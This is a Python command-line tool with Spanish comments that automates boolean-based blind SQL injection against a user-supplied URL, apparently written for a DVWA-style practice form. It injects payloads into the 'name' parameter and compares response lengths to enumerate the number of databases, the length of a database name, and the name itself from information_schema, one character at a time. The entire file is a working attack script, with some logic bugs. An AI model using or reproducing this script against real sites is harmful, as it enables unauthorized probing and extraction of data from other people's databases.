import requests

tamBD = None
tamRes = None
numBD = None
nombreBD = None

def obtener_tam_nombre_bd(url):

  # url encode: ?name=asd'+or+length(database())%3d1+--+-&Submit=Submit
  # normal: ?name=asd' or length(database())=1 -- -&Submit=Submit
  SQLI_length = "?name=asd'+or+length(database())%3d1+--+-"
  lista_tam_res = {}
  
  for i in range (1,26):
    #modifica el numero despues del = por el numero del for
    nueva_SQLI_length = SQLI_length.replace("1", str(i))
    
    #añade la inyeccion sql a la url recibida
    link=url+nueva_SQLI_length
    
    # Enviar la solicitud GET
    res = requests.get(link)
    
    if res.status_code == 200:
      # Obtiene tamaño de respuesta
      tam_res = res.headers['Content-Length']
      #print(nueva_SQLI_length + ": " + tam_res)
      # Almacena el tamaño de la respuesta en un array
      lista_tam_res[i] = tam_res

  # Busca el valor del iterador del bucle con el tamaño máximo
  num_chars = max(lista_tam_res, key=lista_tam_res.get)
  
  return num_chars

    
def obtener_num_bd(url):
  
  SQLI_number_db = "?name=asd'+or+(select+count(schema_name)+from+information_schema.schemata)%3d1+--+-"
  lista_tam_res = {}
  
  for i in range (1,26):
    #modifica el numero despues del = por el numero del for
    nueva_SQLI_number_db = SQLI_number_db.replace("1", str(i))
    
    #añade la inyeccion sql a la url recibida
    link=url+nueva_SQLI_number_db
    
    # Enviar la solicitud GET
    res = requests.get(link)
    
    if res.status_code == 200:
      # Obtiene tamaño de respuesta
      tam_res = res.headers['Content-Length']
      #print(nueva_SQLI_number_db + ": " + tam_res)
      # Almacena el tamaño de la respuesta en un array
      lista_tam_res[i] = tam_res

  # Busca el valor del iterador del bucle con el tamaño máximo
  numDB = max(lista_tam_res, key=lista_tam_res.get)
  
  return numDB
  
def obtener_nombre_bd(tamBD, url):
  
  SQLI_name_bd = "?name=asd'+or+substring((select+schema_name+from+information_schema.schemata+limit+&,1),@,1)='/'+--+-+"
  lista_tam_res = {}
  nombreBD = ""
  letra_max = ""
  max_tam_res = "0"

  try:
    link_temp = url + "?name=*"
    res = requests.get(link_temp)
    res.raise_for_status()
    tam_error=len(res.content)
    #print(tam_error)
  except requests.exceptions.HTTPError:
    print(f"Error al obtener la pagina web: {url}")
    
  opcion = int(input(f"Se han detectado {numBD} bases de datos, ¿De cual quieres obtener el nombre?: \n"))
  valor = SQLI_name_bd.replace("&", str(opcion-1))
  

  for i in range (tamBD):
    nueva_SQLI_name_bd = valor.replace("@", str(i+1))

    for j in range (95, 123):
      caracter = chr(j)
      nueva_SQLI_name_bd1 = nueva_SQLI_name_bd.replace("/", caracter)

      link = url+nueva_SQLI_name_bd1
      # Enviar la solicitud GET
      res = requests.get(link)
      
      if res.status_code == 200:
        # Obtiene tamaño de respuesta
        tam_res = len(res.content)
        #print(tam_res)

        if(tam_res != tam_error):
          nombreBD+=caracter
          #print(nombreBD)


  return nombreBD
 

def main():
  
  global tamBD, tamRes, numBD, nombreBD
  # Recibir el enlace de la página web por consola
  url = input("Introduzca la URL de la página web: ")
  exit=0
  print("\n////////////////////////////////////////////////////////////////////////////////////////////////////////\n")
  
  while(exit==0):
    #Menu
    opcion = input("Elige una ación: \n1: Obtener el número de bases de datos\n2: Obtener el tamaño de la base de datos\n3: Nombre de la base de datos\n4: Salir\n")
  
    if opcion == "1":
      # Obtener el número de bases de datos
      numBD = obtener_num_bd(url)
      print(f"\nNúmero de bases de datos: {numBD}")
      print("\n////////////////////////////////////////////////////////////////////////////////////////////////////////\n")
      
    elif opcion == "2":
      # Obtener la longitud de la base de datos
      tamBD = obtener_tam_nombre_bd(url)
      print(f"\nLongitud nombre BD: {tamBD}")
      print("\n////////////////////////////////////////////////////////////////////////////////////////////////////////\n")
    
    elif opcion == "3":
      nombreBD = obtener_nombre_bd(tamBD, url)
      if nombreBD == 0:
        print("\n[Error]: Todavia no se ha obtenido el tamaño de la base de datos, ejecute primero el punto 2")
        print("\n////////////////////////////////////////////////////////////////////////////////////////////////////////\n")
      else:
        print(f"Nombre de la base de datos: {nombreBD}")
        print("\n////////////////////////////////////////////////////////////////////////////////////////////////////////\n")
  
    elif opcion == "4":
      print("\nSaliendo...")
      exit=1 
    else:
      print("[Error]: Opción no válida\n")
  


if __name__ == "__main__":
  main()
